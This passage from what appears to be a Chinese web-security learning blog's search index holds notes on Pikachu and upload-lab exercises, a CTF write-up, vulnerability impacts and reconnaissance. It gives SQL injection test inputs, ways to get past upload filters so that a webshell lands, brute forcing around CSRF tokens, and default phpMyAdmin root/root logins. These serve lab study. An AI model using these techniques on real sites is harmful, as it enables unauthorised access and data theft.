title="登录脆弱"></a>登录脆弱</h3><p>如果网站采用的协议是http，那么大多数情况下其数据包中登录的账号与密码是不加密的，但不是绝对，此时可以看一下其加密的方式是什么，目前大多是MD5和Base64，此时就可以利用burpsuite进行爆破，但是如果是https协议的话一般加密方式是其自己定义的，所以难以判断加密类型。</p><h4 id="Cookie-脆弱点验证"><a href="#Cookie-脆弱点验证" class="headerlink" title="Cookie 脆弱点验证"></a>Cookie 脆弱点验证</h4><p>其漏洞原理是由于在登陆过程中对用户的cookie进行简单的验证，例如：登录之前会对cookie进行验证，由于方式很过于简单只是对cookie是否为空进行判断，也就是说传递的值不是为空程序就认为你是登录了，因此这就形成了弱cookie登录的漏洞。存在另一种情况就是cookie设置的很简单，我们可以尝试更改cookie的值来达到访问。例如如下图：</p><p><img src="/images/image-20211208133313325.png" alt="image-20211208133313325"></p><p>这里的cookie很简单，所以可以伪造cookie来达到越权访问，或者未授权访问。</p><h2 id="找回机制与接口安全"><a href="#找回机制与接口安全" class="headerlink" title="找回机制与接口安全"></a>找回机制与接口安全</h2><p><strong>找回重置机制</strong>：客户端回显（验证码可以通过在客户端浏览器抓包得到），Response 状态值（根据状态值来确定验证码是否正确，可以通过修改状态值来验证通过），验证码爆破，找回流程绕过（绕过验证码验证）等</p><p><strong>验证码验证时要确定网站时前端验证还是后端验证。</strong></p><p>客户端回显</p><p><strong>接口安全</strong>：接口调用乱用，短信轰炸，来电轰炸等</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 逻辑漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Pikachu漏洞练习</title>
+      <link href="/2021/12/03/Pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0/"/>
+      <url>/2021/12/03/Pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1.暴力破解"></a>1.暴力破解</h1><p>由于在实际挖洞过程中暴力破解的可用性不高，所以此部分只总结思路，但是会演示在存在token的情况下如何爆破。</p><h2 id="1-1-基于表单的爆破"><a href="#1-1-基于表单的爆破" class="headerlink" title="1.1 基于表单的爆破"></a>1.1 基于表单的爆破</h2><p><img src="/images/image-20211203125450890.png" alt="image-20211203125450890"></p><p>这种情况就是直接抓包，暴力破解即可</p><h2 id="1-2-服务器端验证码绕过"><a href="#1-2-服务器端验证码绕过" class="headerlink" title="1.2 服务器端验证码绕过"></a>1.2 服务器端验证码绕过</h2><p>此时可以尝试抓包，看看验证码是否可以重复使用，如果不可以那么一般不可以暴力破解了。</p><h2 id="1-3-客户端验证码绕过"><a href="#1-3-客户端验证码绕过" class="headerlink" title="1.3 客户端验证码绕过"></a>1.3 客户端验证码绕过</h2><p>客户端也就是页面前端，由于是前端设置验证码，只需要抓包，在放包时把验证码参数删去即可。</p><h2 id="1-4-token防爆破？"><a href="#1-4-token防爆破？" class="headerlink" title="1.4 token防爆破？"></a>1.4 token防爆破？</h2><p>抓包，发现存在token</p><p><img src="/images/image-20211203130156176.png" alt="image-20211203130156176"></p><p><strong>采用pitchfork攻击方式</strong></p><p><img src="/images/image-20211203130331052.png" alt="image-20211203130331052"></p><p><strong>设置线程数为1</strong></p><p><img src="/images/image-20211203131053686.png" alt="image-20211203131053686"></p><p><strong>在Grep - Extract 选项添加参数：（要把value的值选中）</strong></p><p><img src="/images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYwNTM1Mg==,size_16,color_FFFFFF,t_70.png" alt="img"></p><p><strong>由于涉及到重定向的问题，这里选择always选项:</strong></p><p><img src="/images/image-20211203131354123.png" alt="image-20211203131354123"></p><p>变量设置字典，<strong>token变量设置递归搜索</strong></p><p><img src="/images/image-20211203131443806.png" alt="image-20211203131443806"></p><p>开始爆破就行了，结果如下：</p><p><img src="/images/image-20211203131633995.png" alt="image-20211203131633995"></p><h1 id="2-xss（跨站脚本）"><a href="#2-xss（跨站脚本）" class="headerlink" title="2. xss（跨站脚本）"></a>2. xss（跨站脚本）</h1><p><img src="/images/image-20211204221544138.png" alt="image-20211204221544138"></p><p><img src="/images/image-20211204221950749.png" alt="image-20211204221950749"></p><h2 id="2-1-反射型xss-get"><a href="#2-1-反射型xss-get" class="headerlink" title="2.1 反射型xss(get)"></a>2.1 反射型xss(get)</h2><p>此种情况属于输入框的内容以get的方式即在URL的参数中进行上传，例如输入框中填写aaa,其出现在了URL参数中</p><p><img src="/images/image-20211204222627314.png" alt="image-20211204222627314"></p><p>尝试直接在URL中插入xss命令。</p><h1 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h1><p><strong>漏洞原理：</strong>Web 程序代码中对于<strong>用户提交的参数未做过滤就直接放到 SQL 语句中执 行</strong>，导致<strong>参数中的特殊字符打破了 SQL 语句原有逻辑</strong>，黑客可以利用该漏洞执 行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以 及绕过登录限制等。</p><p><img src="/images/image-20220628215521946.png" alt="image-20220628215521946"></p><p><strong>注入常规思路：</strong></p><p><img src="/images/image-20220628215729908.png" alt="image-20220628215729908"></p><h2 id="3-1-字符型注入-get"><a href="#3-1-字符型注入-get" class="headerlink" title="3.1 字符型注入(get)"></a>3.1 字符型注入(get)</h2><p><strong>输入的参数为字符型</strong></p><p><img src="/images/image-20220628215807858.png" alt="image-20220628215807858"></p><p>尝试判断是否存在注入（已知存在账户vince）,<strong>输入参数 vince’ and 1=1 %23</strong></p><p><img src="/images/image-20220628220357540.png" alt="image-20220628220357540"></p><p>问题一：为什么要加%23呢？ 因为在sql语句中 # 是注释符，在url编码中 #是 %23，目的是注释掉查询语句后面的符号，避免报错</p><p>问题二：为什么vince要加 ‘ ？因为是字符型输入，<strong>所以在查询语句中是</strong><strong><strong>$query=”select id,email from member where username=’$name’ “;</strong></strong> 加了 ’  是为了闭合前面的 ‘ ，只有这样后面添加的逻辑运算才会生效。</p><p> <strong>输入参数 vince’ and 1=2 %23</strong>，此时可以发现已经满足了SQL注入存在的两个条件。我们输入的参数可以被接到SQL语句中，查询数据库中的信息。</p><p><img src="/images/image-20220628221012758.png" alt="image-20220628221012758"></p><p>接着要猜解查询语句中的字段数 <strong>order by N</strong></p><p><img src="/images/image-20220628221700411.png" alt="image-20220628221700411"></p><p><img src="/images/image-20220628221643857.png" alt="image-20220628221643857"></p><p>可以确定为字段数为2，接着就确定字段顺序，然后开始查询库。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>i春秋练习</title>
+      <link href="/2021/12/03/i%E6%98%A5%E7%A7%8B%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0/"/>
+      <url>/2021/12/03/i%E6%98%A5%E7%A7%8B%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CTF大本营-web-login"><a href="#CTF大本营-web-login" class="headerlink" title="CTF大本营-web login"></a>CTF大本营-web login</h1><p>进入环境后<img src="/images/image-20220309112326729.png" alt="image-20220309112326729"></p><p>查看网页源代码发现最底部出现信息（所以一定要滑倒底部去看完整）</p><p><img src="/images/image-20220309112258942.png" alt="image-20220309112258942"></p><p>经过测试发现可以登录，但是没有显示有用信息</p><p><img src="/images/image-20220309112510961.png" alt="image-20220309112510961"></p><p>于是，抓包查看返回信息，发现特殊信息<strong>show:0</strong></p><p><img src="/images/image-20220309112609587.png" alt="image-20220309112609587"></p><p>尝试请求包中加入<strong>show:1</strong>，得到响应包中返回的源码，进行审计发现要在请求包中有token,token的值是user经过进行unserialize，gzuncompress，base64_decode等一系列操作得到login</p><p><img src="/images/image-20220309113018629.png"></p><p><strong>unserialize：对单一的已序列化的变量进行操作，将其转换回 PHP 的值</strong></p><p><strong>gzuncompress：解压被压缩的字符串</strong></p><p>于是根据操作得到token的值</p><p><img src="/images/image-20220309113613409.png" alt="image-20220309113613409"></p><p>将token的值加入到cookie中就得到了flag.</p><p><img src="/images/image-20220309113716474.png" alt="image-20220309113716474"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>web漏洞</title>
+      <link href="/2021/12/01/web%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2021/12/01/web%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="web漏洞总结"><a href="#web漏洞总结" class="headerlink" title="web漏洞总结"></a>web漏洞总结</h1><p>以下内容来自于小迪渗透课程与(<a href="https://www.yuque.com/samxara/swro13/wk5w9t">https://www.yuque.com/samxara/swro13/wk5w9t</a>)</p><p><img src="/images/1623721425978-e14463d7-40a4-4686-99e5-3ac03dfe8c33-16383273503572.png" alt="img"></p><h1 id="漏洞危害情况"><a href="#漏洞危害情况" class="headerlink" title="漏洞危害情况"></a>漏洞危害情况</h1><h2 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1. SQL注入"></a>1. SQL注入</h2><ul><li>攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</li><li>可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</li><li>如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。</li><li>经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</li></ul><h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2. XSS"></a>2. XSS</h2><ol><li><ul><li>窃取管理员帐号或Cookie，入侵者可以冒充管理员的身份登录后台。使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。</li></ul></li><li><ul><li>窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作</li></ul></li><li><ul><li>网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马</li></ul></li><li><ul><li>发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用</li></ul></li></ol><h2 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3. XXE"></a>3. XXE</h2><ol><li><ul><li>读取任意文件</li><li>执行系统命令</li></ul></li><li><ul><li>探测内网端口</li><li>攻击内网网站</li></ul></li></ol><h2 id="4-文件上传"><a href="#4-文件上传" class="headerlink" title="4. 文件上传"></a>4. 文件上传</h2><p>如果 Web应用程序存在上传漏洞 , 攻击者甚至可以将一个webshell直接上传到服务器上 </p><h2 id="5-文件包含"><a href="#5-文件包含" class="headerlink" title="5. 文件包含"></a>5. 文件包含</h2><p>可能含有文件包含的漏洞：inurl:php?file=</p><ol><li><ul><li>web服务器的文件被外界浏览导致信息泄露</li><li>脚本被任意执行，可能会篡改网站、执行非法操作、攻击其他网站</li></ul></li></ol><h2 id="6-文件读取"><a href="#6-文件读取" class="headerlink" title="6. 文件读取"></a>6. 文件读取</h2><p>通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等</p><h2 id="7-CSRF"><a href="#7-CSRF" class="headerlink" title="7. CSRF"></a>7. CSRF</h2><ol><li><ul><li>以受害者名义发送邮件，发消息，盗取受害者的账号，甚至购买商品，虚拟货币转账，修改受害者的网络配置（比如修改路由器DNS、重置路由器密码）等等</li><li>个人隐私泄露、机密资料泄露、用户甚至企业的财产安全</li></ul></li></ol><h2 id="8-SSRF"><a href="#8-SSRF" class="headerlink" title="8. SSRF"></a>8. SSRF</h2><ul><li><ol><li><p>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息</p></li><li><p>攻击运行在内网或本地的应用程序</p></li></ol></li><li><ol><li><p>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</p></li><li><p>下载内网资源(如：利用file协议读取本地文件等)</p></li></ol></li><li><ol><li><p>进行跳板</p></li><li><p>无视cdn</p></li></ol></li><li><ol><li><p>利用Redis未授权访问，HTTP CRLF注入实现getshell</p><p><img src="/images/image-20220216121849554.png" alt="image-20220216121849554"></p></li></ol></li></ul><h2 id="9-反序列化"><a href="#9-反序列化" class="headerlink" title="9. 反序列化"></a>9. 反序列化</h2><p>远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码，被攻击者间接控制服务器</p><h2 id="10-代码执行"><a href="#10-代码执行" class="headerlink" title="10.代码执行"></a>10.代码执行</h2><ul><li><ol><li><p>代码执行漏洞造成的原理是由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。造成代码执行相关的函数分别是：eval、assert函数</p></li><li><p>暴露服务器信息</p></li></ol></li><li><ol><li><p>木马植入</p></li><li><p>敏感文件暴露</p></li></ol></li><li><ol><li>可能升级为命令执行</li></ol></li></ul><h2 id="11-逻辑漏洞"><a href="#11-逻辑漏洞" class="headerlink" title="11. 逻辑漏洞"></a>11. 逻辑漏洞</h2><ul><li><ol><li><p>在提交订单的时候抓取数据包或者直接修改前端代码，然后对订单的金额任意修改。</p></li><li><p>黑客只需要抓取Response数据包便知道验证码是多少或直接绕过</p></li></ol></li><li><ol><li><p>有些业务的接口，因为缺少了对用户的登陆凭证的较验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作</p></li><li><p>有些关键性的接口因为没有做验证或者其它预防机制，容易遭到枚举攻击</p></li></ol></li><li><ol><li><p>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举</p></li><li><p>单纯读取内存值数据来当作用户凭证</p></li></ol></li><li><ol><li>用户修改密码时，邮箱中会收到一个含有auth的链接，在有效期内用户点击链接，即可进入重置密码环节。而大部分网站对于auth的生成都是采用rand()函数，那么这里就存在一个问题了，Windows环境下rand()最大值为32768，所以这个auth的值是可以被枚举的</li></ol></li></ul><h2 id="12-目录遍历"><a href="#12-目录遍历" class="headerlink" title="12. 目录遍历"></a>12. 目录遍历</h2><p>攻击者通过访问网站某一目录时，该目录没有默认首页文件或没有正确设置默认首页文件，将会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件（如PHPINFO文件、服务器探针文件、网站管理员后台访问地址、数据库连接文件等）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件上传</title>
+      <link href="/2021/12/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+      <url>/2021/12/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="文件上传攻击"><a href="#文件上传攻击" class="headerlink" title="文件上传攻击"></a>文件上传攻击</h1><p>文件上传攻击是攻击者利用Web应用对上传文件过滤不严的漏洞，攻击者将木马上传成功后即可获得当前的webshell。</p><h2 id="1-攻击原理"><a href="#1-攻击原理" class="headerlink" title="1.攻击原理"></a>1.攻击原理</h2><p>假设目标web服务器为Apache+PHP的架构，攻击者通过上传功能上传  “木马”.PHP 到服务器，再访问   “木马”.PHP   所在的目录，由此  “木马”.PHP  会被当做PHP文件执行，进而木马生效。<strong>（需要注意网页用什么语言编写，就要用该语言的木马来上传）</strong></p><h2 id="2-文件上传流程"><a href="#2-文件上传流程" class="headerlink" title="2.文件上传流程"></a>2.文件上传流程</h2><p>整个过程分为三大步骤：</p><ol><li>客户端上传：用户提交上传表单，利用HTML格式实现上传格式的编制（**通过HTML格式中的<from>**），再封装到HTTP包中，开始传输。</li><li>中间件上传：接受客户端提交的HTML表单；将表单内容存储为临时文件；根据安全规范，将临时文件保存为正式文件。</li><li>服务器存储及调用：服务器存储正式文件，并将其存放在中间件规定的真实路径。</li></ol><h2 id="3-上传攻击的条件"><a href="#3-上传攻击的条件" class="headerlink" title="3.上传攻击的条件"></a>3.上传攻击的条件</h2><ol><li>目标网站具有上传功能</li><li>上传的目标文件能被Web服务器解析执行</li><li>知道文件上传到服务器后的存放路径与文件名称</li><li>目标文件可以被用户访问</li></ol><h2 id="4-上传检测绕过技术"><a href="#4-上传检测绕过技术" class="headerlink" title="4.上传检测绕过技术"></a>4.上传检测绕过技术</h2><h3 id="4-1-客户端JavaScript检测及绕过"><a href="#4-1-客户端JavaScript检测及绕过" class="headerlink" title="4.1.客户端JavaScript检测及绕过"></a>4.1.客户端JavaScript检测及绕过</h3><h4 id="4-1-1-JS防护"><a href="#4-1-1-JS防护" class="headerlink" title="4.1.1 JS防护"></a>4.1.1 JS防护</h4><p>在网站中部署JS脚本，在用户访问时，脚本随同网页一起到达客户端浏览器，当用户进行文件上传时，JS脚本对用户表单提交的数据进行检查，如果发现非法后缀则直接终止上传。（一般在上传表单中，例如利用<form>中的onsubmit，onchange事件激活防护代码）</p><h4 id="4-1-2-JS防护绕过方式"><a href="#4-1-2-JS防护绕过方式" class="headerlink" title="4.1.2 JS防护绕过方式"></a>4.1.2 JS防护绕过方式</h4><ol><li>浏览器F12打开开发者工具后删除代码里激活防护代码的事件</li><li>直接更改JS脚本，加入木马的扩展名。</li><li>用户浏览器禁用JS功能，导致过滤功能失效</li></ol><h4 id="pikachu练习平台实例"><a href="#pikachu练习平台实例" class="headerlink" title="pikachu练习平台实例"></a>pikachu练习平台实例</h4><p>1.客户端JS检测</p><p><img src="/images/image-20220315161852078.png" alt="image-20220315161852078"></p><p><img src="/images/image-20220315161911659.png" alt="image-20220315161911659"></p><p>直接删除onchange事件即可完成文件上传</p><h3 id="4-2-服务器端MIME检测及绕过"><a href="#4-2-服务器端MIME检测及绕过" class="headerlink" title="4.2 服务器端MIME检测及绕过"></a>4.2 服务器端MIME检测及绕过</h3><h4 id="4-2-1-MIME防护"><a href="#4-2-1-MIME防护" class="headerlink" title="4.2.1 MIME防护"></a>4.2.1 MIME防护</h4><p>MIME值就是HTTP协议中的Content-Type类型，其防护思路是客户端的浏览器根据上传的文件的后缀名自动生成Content-Type类型，服务器收到HTTP包后，会判断Content-Type是否合法，如果非法则阻断本次上传。</p><p><img src="/images/image-20220315164052339.png" alt="image-20220315164052339"></p><h4 id="4-2-2-MIME防护绕过方式"><a href="#4-2-2-MIME防护绕过方式" class="headerlink" title="4.2.2 MIME防护绕过方式"></a>4.2.2 MIME防护绕过方式</h4><ul><li>HTTP抓包后修改Content-Type类型进而绕过防护，实现木马的上传。</li></ul><h4 id="pikachu练习平台实例-1"><a href="#pikachu练习平台实例-1" class="headerlink" title="pikachu练习平台实例"></a>pikachu练习平台实例</h4><p><img src="/images/image-20220315163840463.png" alt="image-20220315163840463"></p><p>直接将Content-Type类型改为image/jpg 就可以完成绕过。</p><h3 id="4-3-服务器端文件扩展名检测及绕过"><a href="#4-3-服务器端文件扩展名检测及绕过" class="headerlink" title="4.3 服务器端文件扩展名检测及绕过"></a>4.3 服务器端文件扩展名检测及绕过</h3><h4 id="4-3-1-防护思路"><a href="#4-3-1-防护思路" class="headerlink" title="4.3.1 防护思路"></a>4.3.1 防护思路</h4><p>通过服务器对上传的文件扩展名进行检测来判断是否合法，防护手段有<strong>白名单（允许）过滤，黑名单（限制）过滤，文件后缀和文件名重命名</strong>。</p><h4 id="4-3-2-绕过方式"><a href="#4-3-2-绕过方式" class="headerlink" title="4.3.2 绕过方式"></a>4.3.2 绕过方式</h4><p>针对黑名单绕过方式：</p><ul><li>多重测试过滤文件名：可以尝试php4, php5、cer等后缀，此类后缀名不受黑名单限制，同时仍然按照php文件执行。</li><li>判断是否存在大小写绕过：中间件会区分文件名的大小写，但是操作系统不会区分，所以可以修改大小写查看是否可以绕过。</li><li>windows下特殊文件名构造：<strong>构造shell.php.和shell.php_</strong>,由于windows不识别上述后缀机制会自动去掉   <strong>.</strong>   和   <strong>_</strong>   ，从而绕过。</li></ul><h2 id="5-文件上传靶场"><a href="#5-文件上传靶场" class="headerlink" title="5.文件上传靶场"></a>5.文件上传靶场</h2><h2 id="Pass-1"><a href="#Pass-1" class="headerlink" title="Pass-1"></a>Pass-1</h2><p><strong>前端进行后缀名检测</strong>，尝试将一句话木马后缀改为file.jpg,抓包后将后缀名再修改为file.php。</p><p><img src="/images/image-20220610202058186.png" alt="image-20220610202058186"></p><h2 id="Pass-2"><a href="#Pass-2" class="headerlink" title="Pass-2"></a>Pass-2</h2><p><strong>HTTP抓包后修改Content-Type类型进而绕过防护，实现木马的上传</strong></p><p><img src="/images/image-20220610202647022.png" alt="image-20220610202647022"></p><h2 id="Pass-3"><a href="#Pass-3" class="headerlink" title="Pass-3"></a>Pass-3</h2><p><strong>服务器检测文件后缀名</strong></p><p><img src="/images/image-20220610203139857.png" alt="image-20220610203139857"></p><p><img src="/images/image-20220610203931785.png" alt="image-20220610203931785"></p><p>尝试修改后缀名来绕过检测，例如大小写绕过，</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>信息收集</title>
+      <link href="/2021/11/12/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+      <url>/2021/11/12/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<h1 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h1><p>忙里偷闲，总结了一下信息收集的相关知识，后面会对每一个部分进行详细的介绍。</p><p><img src="/images/image-20211112222207592.png" alt="image-20211112222207592"></p><h2 id="网站情况"><a href="#网站情况" class="headerlink" title="网站情况"></a>网站情况</h2><h3 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h3><p>1.Whois查询</p><p>Whois是一个用于查询域名是否被注册以及注册域名详细信息的数据库（如域名所有人，域名注册商），同时用于收集ip地址信息，在kali系统中是已经默认安装好的。使用方式：whois + 域名</p><p><img src="/images/image-20211113125003399.png" alt="image-20211113125003399"></p><p>2.超级ping</p><p>在<a href="http://www.ping.cn中检测域名对应的ip,如果ip都一样,可以暂且认为其真实ip为检测到的,可以通过直接访问ip看看和域名访问到的是否一样./">www.ping.cn中检测域名对应的ip，如果IP都一样，可以暂且认为其真实ip为检测到的，可以通过直接访问ip看看和域名访问到的是否一样。</a></p><p><img src="/images/image-20211113125357674.png" alt="image-20211113125357674"></p><p>3.子域名收集</p><p>（1）可以通过Layer子域名挖掘直接检测</p><p>（2）<a href="https://crt.sh进行子域名枚举/">https://crt.sh进行子域名枚举</a></p><p>4.端口信息收集</p><p>使用namp进行扫描</p><h1 id="小迪安全-信息收集"><a href="#小迪安全-信息收集" class="headerlink" title="小迪安全-信息收集"></a>小迪安全-信息收集</h1><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.png"></p><h2 id="站点搭建分析："><a href="#站点搭建分析：" class="headerlink" title="站点搭建分析："></a>站点搭建分析：</h2><h3 id="搭建习惯-目录型站点"><a href="#搭建习惯-目录型站点" class="headerlink" title="搭建习惯-目录型站点"></a>搭建习惯-目录型站点</h3><p>简单的理解就是当网站的两个页面不同时，其目录下搭建的源码不同，例如：学生网站的上面通过后台扫描探针发现有一个bbs的目录一点击发现是一个bbs的论坛网站如：<a href="http://www.xxx.com/bbs%EF%BC%8C%E5%85%B6%E7%95%8C%E9%9D%A2%E4%B8%8E%E4%B8%BB%E7%95%8C%E9%9D%A2%E4%B8%8D%E5%90%8C%EF%BC%8C%E6%88%91%E4%BB%AC%E6%8A%8A%E8%BF%99%E4%B8%AA%E7%A7%B0%E4%B8%BA%E7%9B%AE%E5%BD%95%E5%9E%8B%E7%BD%91%E7%AB%99%E3%80%81%E5%8F%AF%E4%BB%A5%E6%9C%89%E4%B8%A4%E7%A7%8D%E6%89%BE%E5%88%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%80%9D%E8%B7%AF%E4%B8%80%E4%B8%AA%E6%98%AF%E4%B8%BB%E7%AB%99%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%A6%E5%A4%96%E7%9A%84%E4%B8%80%E4%B8%AA%E6%98%AFbbs%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%BC%8F%E6%B4%9E%E3%80%82">www.xxx.com/bbs，其界面与主界面不同，我们把这个称为目录型网站、可以有两种找到漏洞的思路一个是主站的漏洞另外的一个是bbs上面的漏洞。</a></p><h3 id="搭建习惯-端口类站点"><a href="#搭建习惯-端口类站点" class="headerlink" title="搭建习惯-端口类站点"></a>搭建习惯-端口类站点</h3><p>这种情况是在主网站的端口中存在其他的界面，就是在同一台服务器上，以端口来把网站进行分开，与目录型站点不同的是，其子界面是放在端口中的，目录型是放在目录中。</p><h3 id="搭建习惯-子域名站点"><a href="#搭建习惯-子域名站点" class="headerlink" title="搭建习惯-子域名站点"></a>搭建习惯-子域名站点</h3><p>子域名的搭建源码和主域名不同，但是在同一ip,但是现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</p><h3 id="搭建习惯-类似域名站点"><a href="#搭建习惯-类似域名站点" class="headerlink" title="搭建习惯-类似域名站点"></a>搭建习惯-类似域名站点</h3><p>有些公司由于业务的发展将原来的域名弃用、选择了其他的域名但是我们访问他的旧的域名还是能够访问、有的是二级域名的更换而有的是顶级域名（.com）的更换，可以通过他的旧的域名找到一些突破口</p><h3 id="搭建习惯-旁注-c段站点"><a href="#搭建习惯-旁注-c段站点" class="headerlink" title="搭建习惯-旁注,c段站点"></a>搭建习惯-旁注,c段站点</h3><p>旁注：<strong>同一个服务器</strong>上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。通过旁注查询可以发现同一个服务器上面有两个站点可以通过对另外的一个站点进行突破，可以通过一些旁注查询网站来查询。</p><p>C段：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是<strong>同一个网段</strong>最终拿下服务器、然后通过内网渗透的方式拿下渗透服务器。</p><h3 id="搭建习惯-搭建软件特征站点"><a href="#搭建习惯-搭建软件特征站点" class="headerlink" title="搭建习惯-搭建软件特征站点"></a>搭建习惯-搭建软件特征站点</h3><p>有的网站是借助于第三方的集成搭建工具实现例如：PHPstudy、宝塔等环境这样的集成环境搭建的危害就是泄露了详细的版本信息</p><p><img src="/images/1623315191745-28be7472-876e-4aaa-b0ba-1bb96cfa6860.png" alt="img"></p><p>phpstudy搭建了之后在默认的站点安装了phpmyadmin有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入</p><h2 id="识别WAF"><a href="#识别WAF" class="headerlink" title="识别WAF"></a>识别WAF</h2><p>对于一个网站要是使用了waf而渗透人员没有识别直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问。而识别waf在于有针对性行的绕过各个厂商的waf可能存在着不同的绕过思路。</p><h2 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
